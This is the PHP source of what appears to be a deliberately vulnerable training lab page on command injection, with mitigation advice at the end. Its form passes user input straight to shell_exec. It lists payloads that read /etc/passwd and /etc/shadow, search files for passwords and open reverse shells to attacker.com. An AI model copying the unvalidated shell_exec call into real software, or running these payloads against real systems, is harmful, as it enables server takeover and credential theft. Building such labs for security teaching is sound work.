<?php
// Lab 1: Basic Command Injection
// Vulnerability: Command injection without proper validation

session_start();

$message = '';
$command_output = '';
$user_input = '';

// Simulate command execution (vulnerable to injection)
function execute_command($command) {
    // Vulnerable: Direct execution without validation
    if (empty($command)) {
        return "No command specified.";
    }
    
    // Vulnerable: Direct execution using shell_exec
    $output = @shell_exec($command . ' 2>&1');
    
    if ($output === null) {
        return "Command execution failed or no output.";
    }
    
    return $output;
}

// Handle command execution
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['execute_command'])) {
    $user_input = $_POST['command'] ?? '';
    
    if ($user_input) {
        $command_output = execute_command($user_input);
        
        if (strpos($command_output, 'Command execution failed') !== false) {
            $message = '<div class="alert alert-danger">Command execution failed!</div>';
        } else {
            $message = '<div class="alert alert-success">Command executed successfully!</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 1: Basic Command Injection - Command Injection Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .command-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .command-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Command Injection Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 1: Basic Command Injection</h1>
            <p class="hero-subtitle">Command injection without proper validation</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Low</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates a basic command injection vulnerability where user input is directly used in system commands without proper validation or sanitization. The application allows execution of arbitrary commands on the server.</p>
            <p><strong>Objective:</strong> Inject and execute arbitrary commands to achieve code execution and information disclosure.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct execution without validation
function execute_command($command) {
    if (empty($command)) {
        return "No command specified.";
    }
    
    // Vulnerable: Direct execution using shell_exec
    $output = @shell_exec($command . ' 2>&1');
    
    if ($output === null) {
        return "Command execution failed or no output.";
    }
    
    return $output;
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-terminal me-2"></i>Command Execution
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="command-info">
                            <h5>Available Commands</h5>
                            <p>Try these basic commands:</p>
                            <ul>
                                <li><code>whoami</code> - Current user</li>
                                <li><code>id</code> - User ID information</li>
                                <li><code>pwd</code> - Current directory</li>
                                <li><code>ls</code> - List files</li>
                                <li><code>uname -a</code> - System information</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="execute_command" value="1">
                            <div class="mb-3">
                                <label for="command" class="form-label">Command to Execute</label>
                                <input type="text" class="form-control" id="command" name="command" 
                                       placeholder="Enter command..." value="<?php echo htmlspecialchars($user_input); ?>">
                            </div>
                            <button type="submit" class="btn btn-primary">Execute Command</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($command_output): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-terminal me-2"></i>Command Output
                    </div>
                    <div class="card-body">
                        <div class="command-display">
                            <h5>Command Result</h5>
                            <div class="sensitive-data">
                                <pre><?php echo htmlspecialchars($command_output); ?></pre>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Command Injection</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Direct command execution without validation</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Test Payloads</h5>
                    <ul>
                        <li><code>whoami</code> - Basic command</li>
                        <li><code>id; ls</code> - Multiple commands</li>
                        <li><code>cat /etc/passwd</code> - File reading</li>
                        <li><code>ps aux</code> - Process listing</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Command Injection Payloads</h5>
            <p>Use these payloads to test the command injection vulnerability:</p>
            
            <h6>1. Basic Information Gathering:</h6>
            <div class="code-block">whoami
id
pwd
uname -a
hostname
date</div>

            <h6>2. File System Access:</h6>
            <div class="code-block">ls -la
cat /etc/passwd
cat /etc/hosts
cat /etc/shadow
cat /proc/version
cat /proc/cpuinfo</div>

            <h6>3. Process and System Information:</h6>
            <div class="code-block">ps aux
ps -ef
netstat -an
ss -tuln
lsof -i
df -h
free -m</div>

            <h6>4. Network Information:</h6>
            <div class="code-block">ifconfig
ip addr
route -n
arp -a
nslookup google.com
ping -c 3 8.8.8.8</div>

            <h6>5. User and Permission Information:</h6>
            <div class="code-block">groups
sudo -l
crontab -l
history
env
printenv</div>

            <h6>6. Multiple Command Execution:</h6>
            <div class="code-block">whoami; id; pwd
ls -la; cat /etc/passwd
ps aux; netstat -an
whoami && id && pwd
whoami || id || pwd</div>

            <h6>7. Command Substitution:</h6>
            <div class="code-block">echo $(whoami)
echo `id`
echo $(cat /etc/passwd)
echo `ls -la`</div>

            <h6>8. Pipe and Redirection:</h6>
            <div class="code-block">whoami | cat
id > /tmp/output.txt
ls -la | grep php
cat /etc/passwd | head -5</div>

            <h6>9. Environment Variables:</h6>
            <div class="code-block">echo $PATH
echo $HOME
echo $USER
echo $SHELL
echo $PWD</div>

            <h6>10. File Operations:</h6>
            <div class="code-block">touch /tmp/test.txt
echo "test" > /tmp/test.txt
cat /tmp/test.txt
rm /tmp/test.txt
mkdir /tmp/testdir
rmdir /tmp/testdir</div>

            <h6>11. Advanced Commands:</h6>
            <div class="code-block">find / -name "*.php" 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null</div>

            <h6>12. Reverse Shell (Dangerous):</h6>
            <div class="code-block">bash -i >& /dev/tcp/attacker.com/4444 0>&1
nc -e /bin/bash attacker.com 4444
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Execute arbitrary commands on the server</li>
                <li>Access sensitive files and directories</li>
                <li>Bypass authentication and authorization</li>
                <li>Data exfiltration and sensitive information disclosure</li>
                <li>Server compromise and lateral movement</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper input validation and sanitization</li>
                    <li>Use whitelist-based command validation</li>
                    <li>Avoid direct command execution functions</li>
                    <li>Use parameterized commands and safe APIs</li>
                    <li>Implement proper access controls and permissions</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual command execution patterns</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
